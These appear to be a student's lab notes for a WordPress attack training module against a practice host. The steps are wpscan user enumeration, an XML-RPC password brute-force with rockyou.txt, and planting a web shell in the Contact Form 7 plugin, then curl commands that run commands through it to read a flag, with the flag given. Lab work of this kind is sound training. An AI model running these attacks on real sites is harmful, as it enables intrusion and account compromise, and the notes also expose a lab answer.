# [Attacking WordPress](Attacking%20WordPress.md)
### Perform user enumeration against http://blog.inlanefreight.local. Aside from admin, what is the other user present?

```shell
sudo wpscan --url http://blog.inlanefreight.local --enumerate --api-token nh5AoLogcc0fow<SNIP>
```
![](Screenshot%202026-07-28%20at%2014.41.34.png)
### Using the methods shown in this section, find another system user whose login shell is set to /bin/bash.

```shell
sudo wpscan --password-attack xmlrpc -t 20 -U doug -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
```
![](Screenshot%202026-07-28%20at%2014.40.25.png)
### Using the methods shown in this section, find another system user whose login shell is set to /bin/bash.

Deactivate Form 7 before adding a web shell
![](Screenshot%202026-07-28%20at%2014.51.08.png)
![](Screenshot%202026-07-28%20at%2014.59.32.png)
`/wp-content/plugins/contact-form-7/wp-contact-form-7.php`
![](Screenshot%202026-07-28%20at%2015.01.11.png)
![](Screenshot%202026-07-28%20at%2015.04.26.png)
### Following the steps in this section, obtain code execution on the host and submit the contents of the flag.txt file in the webroot.

![](Screenshot%202026-07-28%20at%2015.11.45.png)

```shell
curl http://blog.inlanefreight.local/wp-content/plugins/contact-form-7/wp-contact-form-7.php?cmd=find%20%2F%20%2Dname%20%22flag%2A%2Etxt%22%202%3E%2Fdev%2Fnull
```
![](Screenshot%202026-07-28%20at%2015.11.59.png)

```shell
curl http://blog.inlanefreight.local/wp-content/plugins/contact-form-7/wp-contact-form-7.php?cmd=cat%20%2Fvar%2Fwww%2Fblog%2Einlanefreight%2Elocal%2Fflag%5Fd8e8fca2dc0f896fd7cb4cb0031ba249%2Etxt

l00k_ma_unAuth_rc3!
```
